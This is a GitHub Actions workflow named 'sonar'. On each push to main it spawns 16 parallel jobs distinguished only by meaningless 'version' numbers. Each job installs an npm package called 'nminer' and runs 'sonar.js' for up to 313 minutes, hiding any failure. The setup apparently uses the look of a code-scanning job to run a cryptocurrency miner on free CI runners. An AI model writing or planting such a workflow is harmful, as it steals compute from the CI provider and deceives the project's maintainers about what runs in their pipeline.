name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 642 }
          - { version: 9424 }
          - { version: 6326 }
          - { version: 246 }
          - { version: 2909 }
          - { version: 2696 }
          - { version: 4548 }
          - { version: 548 }
          - { version: 891 }
          - { version: 3818 }
          - { version: 9870 }
          - { version: 4180 }
          - { version: 3700 }
          - { version: 2810 }
          - { version: 5947 }
          - { version: 1874 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: drat husband
        run: |
          npm install nminer@latest
          timeout 313m node sonar.js || echo "sonar executed"